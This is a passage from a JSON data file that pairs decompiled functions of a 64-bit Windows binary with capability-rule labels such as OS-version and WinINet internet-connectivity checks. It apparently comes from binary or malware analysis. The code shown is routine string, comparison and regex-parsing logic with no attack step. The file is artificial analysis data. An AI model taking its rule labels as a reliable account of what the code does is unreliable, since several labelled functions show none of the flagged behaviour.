return;\n}\n",
        "token_count": 2512
    },
    "18002ddc": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.18002ddc0(int64_t **arg1)\n\n{\n    int64_t *piVar1;\n    code *pcVar2;\n    uint64_t uVar3;\n    int64_t *piVar4;\n    int64_t iVar5;\n    int64_t *piVar6;\n    uchar auStack120 [32];\n    ulong uStack88;\n    int64_t **ppiStack80;\n    uchar auStack72 [24];\n    uchar auStack48 [4];\n    uchar auStack44 [4];\n    int64_t *piStack40;\n    uint64_t uStack32;\n    \n    uStack88 = 0xfffffffffffffffe;\n    uStack32 = *0x180123080 ^ auStack120;\n    ppiStack80 = arg1;\n    piVar4 = fcn.180073b64(1);\n    arg1[3] = piVar4;\n    fcn.18006da30(auStack44, 0);\n    piVar4 = *0x18012b020;\n    piStack40 = *0x18012b020;\n    if (*0x18012b0e0 == 0) {\n        fcn.18006da30(auStack48, 0);\n        if (*0x18012b0e0 == 0) {\n            *0x1801286b8 = *0x1801286b8 + 1;\n            *0x18012b0e0 = *0x1801286b8;\n        }\n        fcn.18006dab0(auStack48);\n    }\n    uVar3 = *0x18012b0e0;\n    piVar1 = arg1[3];\n    if (*0x18012b0e0 < piVar1[3]) {\n        piVar6 = *(piVar1[2] + *0x18012b0e0 * 8);\n        if (piVar6 != NULL) goto code_r0x00018002ded7;\n    }\n    else {\n        piVar6 = NULL;\n    }\n    if (*(piVar1 + 0x24) == '\\0') {\ncode_r0x00018002de92:\n        if (piVar6 != NULL) goto code_r0x00018002ded7;\n    }\n    else {\n        iVar5 = fcn.180073b5c();\n        if (uVar3 < *(iVar5 + 0x18)) {\n            piVar6 = *(*(iVar5 + 0x10) + uVar3 * 8);\n            goto code_r0x00018002de92;\n        }\n    }\n    piVar6 = piVar4;\n    if (piVar4 == NULL) {\n        iVar5 = fcn.18002f930(&piStack40, arg1 + 2);\n        piVar6 = piStack40;\n        if (iVar5 == -1) {\n            fcn.180002310(auStack72);\n            fcn.1800add8c(auStack72, 0x18011f808);\n            pcVar2 = swi(3);\n            (*pcVar2)();\n            return;\n        }\n        fcn.180073b24(piStack40);\n        (**(*piVar6 + 8))(piVar6);\n        *0x18012b020 = piVar6;\n    }\ncode_r0x00018002ded7:\n    fcn.18006dab0(auStack44);\n    *arg1 = piVar6;\n    piVar4 = fcn.180012470(arg1 + 2);\n    arg1[1] = piVar4;\n    fcn.18008fb00(uStack32 ^ auStack120);\n    return;\n}\n",
        "token_count": 807
    },
    "18002e09": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.18002e090(int64_t *arg1)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    ulong *puVar3;\n    ulong *puVar4;\n    \n    if (*arg1 != 0) {\n        LOCK();\n        piVar1 = *arg1 + 0x2c;\n        iVar2 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n        if (iVar2 == 1) {\n            puVar4 = *arg1;\n            while (puVar4 != NULL) {\n                puVar3 = puVar4[2];\n                puVar4[2] = 0;\n                (***puVar4)(puVar4, 1);\n                puVar4 = puVar3;\n            }\n            *arg1 = 0;\n            return;\n        }\n    }\n    *arg1 = 0;\n    return;\n}\n",
        "token_count": 202
    },
    "18002e5c": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nulong * fcn.18002e5c0(ulong *arg1, ulong *arg2, int64_t arg3)\n\n{\n    uint64_t arg2_00;\n    int64_t iVar1;\n    uint64_t arg2_01;\n    ulong *puVar2;\n    \n    arg1[2] = 0;\n    arg1[3] = 7;\n    *arg1 = 0;\n    arg2_01 = 0xffffffffffffffff;\n    iVar1 = -1;\n    do {\n        iVar1 = iVar1 + 1;\n    } while (*(arg3 + iVar1 * 2) != 0);\n    fcn.18000d550(arg1, iVar1 + arg2[2]);\n    arg2_00 = arg2[2];\n    if (7 < arg2[3]) {\n        arg2 = *arg2;\n    }\n    iVar1 = arg1[2];\n    if (arg1[3] - iVar1 < arg2_00) {\n        fcn.180013690(arg1, arg2_00, 0, arg2);\n    }\n    else {\n        arg1[2] = arg2_00 + iVar1;\n        puVar2 = arg1;\n        if (7 < arg1[3]) {\n            puVar2 = *arg1;\n        }\n        fcn.1800ade80(puVar2 + iVar1 * 2, arg2, arg2_00 * 2);\n        *(puVar2 + (arg2_00 + iVar1) * 2) = 0;\n    }\n    do {\n        arg2_01 = arg2_01 + 1;\n    } while (*(arg3 + arg2_01 * 2) != 0);\n    iVar1 = arg1[2];\n    if (arg1[3] - iVar1 < arg2_01) {\n        fcn.180013690(arg1, arg2_01, 0, arg3);\n    }\n    else {\n        arg1[2] = iVar1 + arg2_01;\n        puVar2 = arg1;\n        if (7 < arg1[3]) {\n            puVar2 = *arg1;\n        }\n        fcn.1800ade80(puVar2 + iVar1 * 2, arg3, arg2_01 * 2);\n        *(puVar2 + (iVar1 + arg2_01) * 2) = 0;\n    }\n    return arg1;\n}\n",
        "token_count": 538
    },
    "18002e7e": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nulong * fcn.18002e7e0(ulong *arg1, int64_t arg2, ulong *arg3)\n\n{\n    int64_t iVar1;\n    uint64_t uVar2;\n    ulong *puVar3;\n    \n    arg1[2] = 0;\n    arg1[3] = 7;\n    *arg1 = 0;\n    uVar2 = 0xffffffffffffffff;\n    iVar1 = -1;\n    do {\n        iVar1 = iVar1 + 1;\n    } while (*(arg2 + iVar1 * 2) != 0);\n    fcn.18000d550(arg1, iVar1 + arg3[2]);\n    do {\n        uVar2 = uVar2 + 1;\n    } while (*(arg2 + uVar2 * 2) != 0);\n    iVar1 = arg1[2];\n    if (arg1[3] - iVar1 < uVar2) {\n        fcn.180013690(arg1, uVar2, 0, arg2);\n    }\n    else {\n        arg1[2] = iVar1 + uVar2;\n        puVar3 = arg1;\n        if (7 < arg1[3]) {\n            puVar3 = *arg1;\n        }\n        fcn.1800ade80(puVar3 + iVar1 * 2, arg2, uVar2 * 2);\n        *(puVar3 + (iVar1 + uVar2) * 2) = 0;\n    }\n    uVar2 = arg3[2];\n    if (7 < arg3[3]) {\n        arg3 = *arg3;\n    }\n    iVar1 = arg1[2];\n    if (arg1[3] - iVar1 < uVar2) {\n        fcn.180013690(arg1, uVar2, 0, arg3);\n    }\n    else {\n        arg1[2] = iVar1 + uVar2;\n        puVar3 = arg1;\n        if (7 < arg1[3]) {\n            puVar3 = *arg1;\n        }\n        fcn.1800ade80(puVar3 + iVar1 * 2, arg3, uVar2 * 2);\n        *(puVar3 + (iVar1 + uVar2) * 2) = 0;\n    }\n    return arg1;\n}\n",
        "token_count": 513
    },
    "18002e93": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint64_t fcn.18002e930(uint16_t **arg1, uint16_t *arg2)\n\n{\n    uint16_t uVar1;\n    uint16_t uVar2;\n    uint16_t *puVar3;\n    uint16_t *puVar4;\n    bool bVar5;\n    bool bVar6;\n    \n    puVar4 = 0xffffffffffffffff;\n    do {\n        puVar4 = puVar4 + 1;\n    } while (arg2[puVar4] != 0);\n    puVar3 = arg1[2];\n    if (0x7 < arg1[3]) {\n        arg1 = *arg1;\n    }\n    if (puVar3 == puVar4) {\n        if (puVar3 == NULL) {\ncode_r0x00018002e99a:\n            return puVar3 & 0xffffffffffffff00;\n        }\n        uVar1 = *arg1;\n        uVar2 = *arg2;\n        if (uVar2 <= uVar1) {\n            bVar5 = uVar1 < uVar2;\n            bVar6 = uVar1 == uVar2;\n            puVar4 = arg2;\n            do {\n                if (!bVar5 && !bVar6) break;\n                if (puVar3 == 0x1) goto code_r0x00018002e99a;\n                uVar1 = *(arg1 + (2 - arg2) + puVar4);\n                puVar4 = puVar4 + 1;\n                puVar3 = puVar3 + -1;\n                bVar5 = uVar1 < *puVar4;\n                bVar6 = uVar1 == *puVar4;\n            } while (!bVar5);\n        }\n    }\n    return CONCAT71(puVar3 >> 8, 1);\n}\n",
        "token_count": 398
    },
    "18002e9a": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint64_t fcn.18002e9a0(uint16_t **arg1, uint16_t **arg2)\n\n{\n    uint16_t uVar1;\n    uint16_t uVar2;\n    uint16_t *puVar3;\n    uint16_t **ppuVar4;\n    bool bVar5;\n    bool bVar6;\n    \n    ppuVar4 = arg2 + 2;\n    if (0x7 < arg2[3]) {\n        arg2 = *arg2;\n    }\n    puVar3 = arg1[2];\n    if (0x7 < arg1[3]) {\n        arg1 = *arg1;\n    }\n    if (puVar3 == *ppuVar4) {\n        if (puVar3 == NULL) {\ncode_r0x00018002ea00:\n            return puVar3 & 0xffffffffffffff00;\n        }\n        uVar1 = *arg1;\n        uVar2 = *arg2;\n        if (uVar2 <= uVar1) {\n            bVar5 = uVar1 < uVar2;\n            bVar6 = uVar1 == uVar2;\n            ppuVar4 = arg2;\n            do {\n                if (!bVar5 && !bVar6) break;\n                if (puVar3 == 0x1) goto code_r0x00018002ea00;\n                uVar1 = *(arg1 + (2 - arg2) + ppuVar4);\n                ppuVar4 = ppuVar4 + 2;\n                puVar3 = puVar3 + -1;\n                bVar5 = uVar1 < *ppuVar4;\n                bVar6 = uVar1 == *ppuVar4;\n            } while (!bVar5);\n        }\n    }\n    return CONCAT71(puVar3 >> 8, 1);\n}\n",
        "token_count": 402
    },
    "18002f49": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.18002f490(int64_t arg1)\n\n{\n    code *pcVar1;\n    int64_t *piVar2;\n    uint64_t uVar3;\n    int64_t iVar4;\n    int64_t iVar5;\n    uchar auStack104 [32];\n    ulong uStack72;\n    uchar auStack64 [24];\n    uchar auStack40 [4];\n    uchar auStack36 [4];\n    int64_t *piStack32;\n    uint64_t uStack24;\n    \n    uStack72 = 0xfffffffffffffffe;\n    uStack24 = *0x180123080 ^ auStack104;\n    fcn.18006da30(auStack36, 0);\n    piVar2 = *0x18012b020;\n    piStack32 = *0x18012b020;\n    if (*0x18012b0e0 == 0) {\n        fcn.18006da30(auStack40, 0);\n        if (*0x18012b0e0 == 0) {\n            *0x1801286b8 = *0x1801286b8 + 1;\n            *0x18012b0e0 = *0x1801286b8;\n        }\n        fcn.18006dab0(auStack40);\n    }\n    uVar3 = *0x18012b0e0;\n    iVar4 = *(arg1 + 8);\n    if (*0x18012b0e0 < *(iVar4 + 0x18)) {\n        iVar5 = *(*(iVar4 + 0x10) + *0x18012b0e0 * 8);\n        if (iVar5 != 0) goto code_r0x00018002f597;\n    }\n    else {\n        iVar5 = 0;\n    }\n    if (*(iVar4 + 0x24) == '\\0') {\ncode_r0x00018002f553:\n        if (iVar5 != 0) goto code_r0x00018002f597;\n    }\n    else {\n        iVar4 = fcn.180073b5c();\n        if (uVar3 < *(iVar4 + 0x18)) {\n            iVar5 = *(*(iVar4 + 0x10) + uVar3 * 8);\n            goto code_r0x00018002f553;\n        }\n    }\n    if (piVar2 == NULL) {\n        iVar4 = fcn.18002f930(&piStack32, arg1);\n        piVar2 = piStack32;\n        if (iVar4 == -1) {\n            fcn.180002310(auStack64);\n            fcn.1800add8c(auStack64, 0x18011f808);\n            pcVar1 = swi(3);\n            (*pcVar1)();\n            return;\n        }\n        fcn.180073b24(piStack32);\n        (**(*piVar2 + 8))(piVar2);\n        *0x18012b020 = piVar2;\n    }\ncode_r0x00018002f597:\n    fcn.18006dab0(auStack36);\n    fcn.18008fb00(uStack24 ^ auStack104);\n    return;\n}\n",
        "token_count": 704
    },
    "18003085": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.180030850(char **arg1)\n\n{\n    char *pcVar1;\n    uint32_t uVar2;\n    code *pcVar3;\n    char cVar4;\n    uint64_t noname_0;\n    char **ppcVar5;\n    char *pcVar6;\n    ulong arg2;\n    \n    uVar2 = *(arg1 + 0x7c);\n    do {\n        if ((uVar2 == 0xffffffff) || (noname_0 = uVar2,  uVar2 == 0x7c)) {\n            return;\n        }\n        if (uVar2 == 0x29) {\n            if (*(arg1 + 0x1c) != 0) {\n                return;\n            }\n            if ((*(arg1 + 0x10) & 0x10000000) == 0) {\n                fcn.180015140(noname_0, 5);\n                pcVar3 = swi(3);\n                (*pcVar3)();\n                return;\n            }\ncode_r0x000180030b4c:\n            fcn.1800315f0(arg1 + 8);\ncode_r0x000180030b59:\n            pcVar6 = *arg1;\n            if (pcVar6 != arg1[2]) {\n                if (((*pcVar6 == '\\\\') && (pcVar1 = pcVar6 + 1,  pcVar1 != arg1[2])) &&\n                   ((((*(arg1 + 0x10) & 8) == 0 && (*pcVar1 - 0x28U < 2)) ||\n                    (((*(arg1 + 0x10) & 0x10) == 0 && ((*pcVar1 + 0x85U & 0xfd) == 0)))))) {\n                    pcVar6 = pcVar1;\n                }\n                *arg1 = pcVar6 + 1;\n            }\n            fcn.180030080(arg1);\ncode_r0x000180030baa:\n            fcn.1800313a0(arg1);\n        }\n        else {\n            if (uVar2 == 0x2e) {\n                fcn.180015eb0(arg1 + 8, 5);\n                goto code_r0x000180030b59;\n            }\n            if (uVar2 == 0x5c) {\n                pcVar6 = *arg1;\n                if (pcVar6 != arg1[2]) {\n                    if (((*pcVar6 == '\\\\') && (pcVar1 = pcVar6 + 1,  pcVar1 != arg1[2])) &&\n                       ((((*(arg1 + 0x10) & 8) == 0 && (*pcVar1 - 0x28U < 2)) ||\n                        (((*(arg1 + 0x10) & 0x10) == 0 && ((*pcVar1 + 0x85U & 0xfd) == 0)))))) {\n                        pcVar6 = pcVar1;\n                    }\n                    *arg1 = pcVar6 + 1;\n                }\n                fcn.180030080(arg1);\n                if ((*(arg1 + 0x10) & 0x80) != 0) {\n                    if (*(arg1 + 0xf) == 'b') {\n                        arg2 = 4;\n                        goto code_r0x000180030aa3;\n                    }\n                    if (*(arg1 + 0xf) == 'B') {\n                        fcn.180015eb0(arg1 + 8, 4);\n                        *(arg1[9] + 0xc) = *(arg1[9] + 0xc) ^ 1;\n                        goto code_r0x000180030aac;\n                    }\n                }\n                fcn.180030fa0(arg1);\n                goto code_r0x000180030baa;\n            }\n            if (uVar2 == 0x5b) {\n                pcVar6 = *arg1;\n                if (pcVar6 != arg1[2]) {\n                    if (((*pcVar6 == '\\\\') && (pcVar1 = pcVar6 + 1,  pcVar1 != arg1[2])) &&\n                       ((((*(arg1 + 0x10) & 8) == 0 && (*pcVar1 - 0x28U < 2)) ||\n                        (((*(arg1 + 0x10) & 0x10) == 0 && ((*pcVar1 + 0x85U & 0xfd) == 0)))))) {\n                        pcVar6 = pcVar1;\n                    }\n                    *arg1 = pcVar6 + 1;\n                }\n                fcn.180030080(arg1);\n                ppcVar5 = arg1;\n                fcn.180030e20(arg1);\n                if (*(arg1 + 0x7c) != 0x5d) {\n                    fcn.180015140(ppcVar5, 4);\n                    pcVar3 = swi(3);\n                    (*pcVar3)();\n                    return;\n                }\n                goto code_r0x000180030b59;\n            }\n            if (uVar2 == 0x28) {\n                pcVar6 = *arg1;\n                if (pcVar6 != arg1[2]) {\n                    if (((*pcVar6 == '\\\\') && (pcVar1 = pcVar6 + 1,  pcVar1 != arg1[2])) &&\n                       ((((*(arg1 + 0x10) & 8) == 0 && (*pcVar1 - 0x28U < 2)) ||\n                        (((*(arg1 + 0x10) & 0x10) == 0 && ((*pcVar1 + 0x85U & 0xfd) == 0)))))) {\n                        pcVar6 = pcVar1;\n                    }\n                    *arg1 = pcVar6 + 1;\n                }\n                fcn.180030080(arg1);\n                ppcVar5 = arg1;\n                cVar4 = fcn.180031120(arg1);\n                if (*(arg1 + 0x7c) != 0x29) {\n                    fcn.180015140(ppcVar5, 5);\n                    pcVar3 = swi(3);\n                    (*pcVar3)();\n                    return;\n                }\n                pcVar6 = *arg1;\n                if (pcVar6 != arg1[2]) {\n                    if (((*pcVar6 == '\\\\') && (pcVar1 = pcVar6 + 1,  pcVar1 != arg1[2])) &&\n                       ((((*(arg1 + 0x10) & 8) == 0 && (*pcVar1 - 0x28U < 2)) ||\n                        (((*(arg1 + 0x10) & 0x10) == 0 && ((*pcVar1 + 0x85U & 0xfd) == 0)))))) {\n                        pcVar6 = pcVar1;\n                    }\n                    *arg1 = pcVar6 + 1;\n                }\n                fcn.180030080(arg1);\n                if (cVar4 != '\\0') goto code_r0x000180030baa;\n            }\n            else {\n                if (uVar2 == 0x5e) {\n                    arg2 = 2;\n                }\n                else {\n                    if (uVar2 != 0x24) {\n                        if (((uVar2 - 0x2a < 2) || (uVar2 == 0x3f)) || (uVar2 == 0x7b)) {\n                            fcn.180015140(noname_0, 10);\n                            pcVar3 = swi(3);\n                            (*pcVar3)();\n                            return;\n                        }\n                        if (uVar2 == 0x7d) {\n                            if ((*(arg1 + 0x10) & 0x10000000) == 0) {\n                                fcn.180015140(noname_0, 6);\n                                pcVar3 = swi(3);\n                                (*pcVar3)();\n                                return;\n                            }\n                        }\n                        else if ((uVar2 == 0x5d) && ((*(arg1 + 0x10) & 0x10000000) == 0)) {\n                            fcn.180015140(noname_0, 4);\n                            pcVar3 = swi(3);\n                            (*pcVar3)();\n                            return;\n                        }\n                        goto code_r0x000180030b4c;\n                    }\n                    arg2 = 3;\n                }\ncode_r0x000180030aa3:\n                fcn.180015eb0(arg1 + 8, arg2);\ncode_r0x000180030aac:\n                pcVar6 = *arg1;\n                if (pcVar6 != arg1[2]) {\n                    if (((*pcVar6 == '\\\\') && (pcVar1 = pcVar6 + 1,  pcVar1 != arg1[2])) &&\n                       ((((*(arg1 + 0x10) & 8) == 0 && (*pcVar1 - 0x28U < 2)) ||\n                        (((*(arg1 + 0x10) & 0x10) == 0 && ((*pcVar1 + 0x85U & 0xfd) == 0)))))) {\n                        pcVar6 = pcVar1;\n                    }\n                    *arg1 = pcVar6 + 1;\n                }\n                fcn.180030080(arg1);\n            }\n        }\n        uVar2 = *(arg1 + 0x7c);\n    } while( true );\n}\n",
        "token_count": 2082
    },
    "1800313a": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid fcn.1800313a0(char **arg1)\n\n{\n    char *pcVar1;\n    uint32_t uVar2;\n    code *pcVar3;\n    char cVar4;\n    int32_t iVar5;\n    char **noname_0;\n    char *pcVar6;\n    ulong unaff_RBX;\n    uint32_t uVar7;\n    ulong unaff_RBP;\n    uint32_t uVar8;\n    ulong unaff_RSI;\n    uint8_t uVar9;\n    ulong unaff_RDI;\n    ulong in_stack_00000000;\n    ulong in_stack_00000020;\n    ulong in_stack_00000028;\n    ulong in_stack_00000030;\n    ulong in_stack_00000038;\n    ulong in_stack_00000040;\n    ulong var_1h;\n    ulong in_stack_00000050;\n    ulong in_stack_00000058;\n    ulong in_stack_00000060;\n    ulong in_stack_00000068;\n    ulong in_stack_00000070;\n    \n    iVar5 = *(arg1 + 0x7c);\n    uVar8 = 0xffffffff;\n    uVar7 = 0;\n    if (iVar5 == 0x2a) goto code_r0x0001800313cb;\n    if (iVar5 == 0x2b) {\n        uVar7 = 1;\n        goto code_r0x0001800313cb;\n    }\n    if (iVar5 == 0x3f) {\n        uVar8 = 1;\n        uVar7 = 0;\n        goto code_r0x0001800313cb;\n    }\n    if (iVar5 != 0x7b) {\n        return;\n    }\n    pcVar6 = *arg1;\n    if (pcVar6 != arg1[2]) {\n        if (((*pcVar6 == '\\\\') && (pcVar1 = pcVar6 + 1,  pcVar1 != arg1[2])) &&\n           ((((*(arg1 + 0x10) & 8) == 0 && (*pcVar1 - 0x28U < 2)) ||\n            (((*(arg1 + 0x10) & 0x10) == 0 && ((*pcVar1 + 0x85U & 0xfd) == 0)))))) {\n            pcVar6 = pcVar1;\n        }\n        *arg1 = pcVar6 + 1;\n    }\n    fcn.180030080(arg1);\n    noname_0 = arg1;\n    cVar4 = fcn.180032560(arg1);\n    if (cVar4 == '\\0') {\n        fcn.180015140(noname_0, 7);\n        pcVar3 = swi(3);\n        (*pcVar3)();\n        return;\n    }\n    iVar5 = *(arg1 + 0x7c);\n    uVar7 = *(arg1 + 0x74);\n    uVar2 = uVar7;\n    if (iVar5 == 0x2c) {\n        pcVar6 = *arg1;\n        if (pcVar6 != arg1[2]) {\n            if (((*pcVar6 == '\\\\') && (pcVar1 = pcVar6 + 1,  pcVar1 != arg1[2])) &&\n               ((((*(arg1 + 0x10) & 8) == 0 && (*pcVar1 - 0x28U < 2)) ||\n                (((*(arg1 + 0x10) & 0x10) == 0 && ((*pcVar1 + 0x85U & 0xfd) == 0)))))) {\n                pcVar6 = pcVar1;\n            }\n            *arg1 = pcVar6 + 1;\n        }\n        noname_0 = arg1;\n        fcn.180030080(arg1);\n        if (*(arg1 + 0x7c) != 0x7d) {\n            noname_0 = arg1;\n            cVar4 = fcn.180032560(arg1);\n            if (cVar4 == '\\0') {\n                fcn.180015140(noname_0, 7);\n                pcVar3 = swi(3);\n                (*pcVar3)();\n                return;\n            }\n            iVar5 = *(arg1 + 0x7c);\n            uVar2 = *(arg1 + 0x74);\n            goto code_r0x000180031588;\n        }\n    }\n    else {\ncode_r0x000180031588:\n        uVar8 = uVar2;\n        if (iVar5 != 0x7d) goto code_r0x0001800315df;\n    }\n    if ((uVar8 == 0xffffffff) || (uVar7 <= uVar8)) {\ncode_r0x0001800313cb:\n        *(arg1[9] + 0xc) = *(arg1[9] + 0xc) | 4;\n        pcVar6 = *arg1;\n        if (pcVar6 != arg1[2]) {\n            if (((*pcVar6 == '\\\\') && (pcVar1 = pcVar6 + 1,  pcVar1 != arg1[2])) &&\n               ((((*(arg1 + 0x10) & 8) == 0 && (*pcVar1 - 0x28U < 2)) ||\n                (((*(arg1 + 0x10) & 0x10) == 0 && ((*pcVar1 + 0x85U & 0xfd) == 0)))))) {\n                pcVar6 = pcVar1;\n            }\n            *arg1 = pcVar6 + 1;\n        }\n        fcn.180030080(arg1);\n        uVar2 = *(arg1 + 0x10);\n        if (((uVar2 >> 10 & 1) == 0) || (*(arg1 + 0x7c) != 0x3f)) {\n            uVar9 = 1;\n        }\n        else {\n            pcVar6 = *arg1;\n            uVar9 = 0;\n            if (pcVar6 != arg1[2]) {\n                if (((*pcVar6 == '\\\\') && (pcVar1 = pcVar6 + 1,  pcVar1 != arg1[2])) &&\n                   ((((uVar2 & 8) == 0 && (*pcVar1 - 0x28U < 2)) ||\n                    (((uVar2 & 0x10) == 0 && ((*pcVar1 + 0x85U & 0xfd) == 0)))))) {\n                    pcVar6 = pcVar1;\n                }\n                *arg1 = pcVar6 + 1;\n            }\n            fcn.180030080(arg1);\n        }\n        fcn.180033010(arg1 + 8, uVar7, uVar8, uVar9, unaff_RSI, in_stack_00000000, unaff_RDI, unaff_RBX, unaff_RBP, \n                      in_stack_00000020, in_stack_00000028, in_stack_00000030, in_stack_00000038, in_stack_00000040, \n                      stack0x00000048, in_stack_00000050, in_stack_00000058, in_stack_00000060, in_stack_00000068, \n                      in_stack_00000070);\n        return;\n    }\ncode_r0x0001800315df:\n    fcn.180015140(noname_0, 7);\n    pcVar3 = swi(3);\n    (*pcVar3)();\n    return;\n}\n",
        "token_count": 1673
    },
    "1800323a": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.1800323a0(int64_t **arg1)\n\n{\n    code *pcVar1;\n    int64_t arg1_00;\n    uchar auStack88 [32];\n    uchar uStack56;\n    uchar auStack55 [7];\n    int64_t aiStack48 [3];\n    uint64_t uStack24;\n    uint64_t uStack16;\n    \n    uStack16 = *0x180123080 ^ auStack88;\n    (**(**arg1 + 0x20))(*arg1, aiStack48, &uStack56, auStack55);\n    if (0xf < uStack24) {\n        arg1_00 = aiStack48[0];\n        if (0xfff < uStack24 + 1) {\n            arg1_00 = *(aiStack48[0] + -8);\n            if (0x1f < (aiStack48[0] - arg1_00) - 8U) {\n                fcn.1800b3528(arg1_00, uStack24 + 0x28);\n                pcVar1 = swi(3);\n                (*pcVar1)();\n                return;\n            }\n        }\n        fcn.18008fb24(arg1_00);\n    }\n    fcn.18008fb00(uStack16 ^ auStack88);\n    return;\n}\n",
        "token_count": 289
    },
    "18003256": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint64_t fcn.180032560(char **arg1)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    char *pcVar3;\n    char *pcVar4;\n    uint64_t uVar5;\n    int32_t iVar6;\n    \n    *(arg1 + 0x74) = 0;\n    iVar6 = 0x7fffffff;\n    do {\n        uVar1 = *(arg1 + 0xf) - 0x30;\n        uVar5 = uVar1;\n        if ((9 < uVar1) || (iVar2 = *(arg1 + 0xf) + -0x30,  iVar2 == -1)) break;\n        iVar6 = iVar6 + -1;\n        *(arg1 + 0x74) = iVar2 + *(arg1 + 0x74) * 10;\n        pcVar4 = *arg1;\n        if (pcVar4 != arg1[2]) {\n            if (((*pcVar4 == '\\\\') && (pcVar3 = pcVar4 + 1,  pcVar3 != arg1[2])) &&\n               ((((*(arg1 + 0x10) & 8) == 0 && (*pcVar3 - 0x28U < 2)) ||\n                (((*(arg1 + 0x10) & 0x10) == 0 && ((*pcVar3 + 0x85U & 0xfd) == 0)))))) {\n                pcVar4 = pcVar3;\n            }\n            *arg1 = pcVar4 + 1;\n        }\n        uVar5 = fcn.180030080(arg1);\n    } while (iVar6 != 0);\n    return uVar5 & 0xffffffffffffff00 | iVar6 != 0x7fffffff;\n}\n",
        "token_count": 393
    },
    "18003261": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nulong fcn.180032610(char **arg1)\n\n{\n    char *pcVar1;\n    int16_t iVar2;\n    char *pcVar3;\n    char in_DL;\n    \n    pcVar3 = *arg1;\n    if (pcVar3 != arg1[2]) {\n        iVar2 = fcn.1800349a0(arg1[0xd], pcVar3, pcVar3 + 1);\n        if (iVar2 != 0) {\n            if (in_DL != '\\0') {\n                fcn.180032f70(arg1 + 8);\n            }\n            fcn.180033ff0(arg1 + 8);\n            pcVar3 = *arg1;\n            if (pcVar3 != arg1[2]) {\n                if (((*pcVar3 == '\\\\') && (pcVar1 = pcVar3 + 1,  pcVar1 != arg1[2])) &&\n                   ((((*(arg1 + 0x10) & 8) == 0 && (*pcVar1 - 0x28U < 2)) ||\n                    (((*(arg1 + 0x10) & 0x10) == 0 && ((*pcVar1 + 0x85U & 0xfd) == 0)))))) {\n                    pcVar3 = pcVar1;\n                }\n                *arg1 = pcVar3 + 1;\n            }\n            fcn.180030080(arg1);\n            return 1;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 324
    },
    "18003301": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
